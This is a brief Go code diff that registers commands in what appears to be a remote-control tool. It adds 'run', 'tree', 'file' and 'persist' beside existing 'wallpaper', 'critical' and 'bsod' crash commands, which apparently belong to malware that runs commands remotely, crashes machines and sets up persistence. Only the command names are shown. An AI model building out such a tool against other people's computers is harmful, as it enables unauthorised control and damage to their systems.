@@ -23,4 +23,8 @@ func registerCommands() {
 	commandsList["wallpaper"] = &commands.WallpaperCommand{}
 	commandsList["critical"] = &commands.CriticalCommand{}
 	commandsList["bsod"] = &commands.CrashCommand{}
+	commandsList["run"] = &commands.RunCommand{}
+	commandsList["tree"] = &commands.TreeCommand{}
+	commandsList["file"] = &commands.FileCommand{}
+	commandsList["persist"] = &commands.PersistCommand{}
 }
